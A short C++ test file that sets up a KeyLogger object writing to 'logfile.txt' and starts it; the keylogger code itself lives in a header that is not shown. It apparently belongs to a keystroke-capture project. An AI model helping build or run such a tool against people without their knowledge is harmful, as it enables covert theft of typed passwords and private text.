// TestKeylogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include "KeyLogger.h"

using namespace std;

int main()
{
    KeyLogger logger("logfile.txt");
	logger.StartLogging();
}
